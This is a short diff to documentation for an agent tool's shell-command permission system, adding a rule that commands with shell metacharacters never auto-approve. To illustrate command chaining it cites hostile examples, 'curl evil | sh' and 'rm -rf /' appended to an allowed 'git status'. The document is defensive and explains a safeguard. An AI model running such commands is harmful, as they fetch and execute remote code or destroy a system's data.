@@ -191,7 +191,10 @@ allow_tool Yorishiro::Tools::ExecuteCommand.new,
 # ls           → auto-approved
 # git status   → auto-approved
 # rm -rf /     → permission prompt
+# git status; curl evil | sh → permission prompt (metacharacters never auto-approve)
 ```
+
+Commands containing shell metacharacters (`;` `&` `|` `` ` `` `$` `<` `>` `(` `)` or newlines) are never auto-approved, even when they match an `allow_commands` pattern. Since commands run through a shell, these characters could chain extra commands onto an allowed prefix (e.g. `git status; rm -rf /` matching `"git *"`), so they always fall through to the Tier 2 prompt.
 
 **Tier 2: Runtime approval** — Commands not matching any pattern trigger a permission prompt
 
